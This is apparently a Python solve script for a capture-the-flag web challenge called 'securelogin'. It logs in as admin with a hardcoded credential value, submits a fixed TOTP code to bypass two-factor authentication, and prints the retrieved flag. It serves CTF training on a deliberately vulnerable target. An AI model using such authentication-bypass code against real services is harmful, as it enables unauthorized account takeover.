import requests

URL = "http://securelogin.challs.olicyber.it/"

s = requests.Session()
response = s.post(URL+"/login", json={"username":"admin", "password":"5d08a95e13ee227fb04dfb425bcc690176a9680e1bc8192b7d55db57f3d9a38b"})

totp = "448667"

response2 = s.get(URL+"/2fa?code="+totp)

response3 = s.get(URL+"/user-info")

print(response3.text) # flag{m4g4ri_1nvi4re_1l_s3cret_così_n0n_è_una_bu0n4_1d3a...}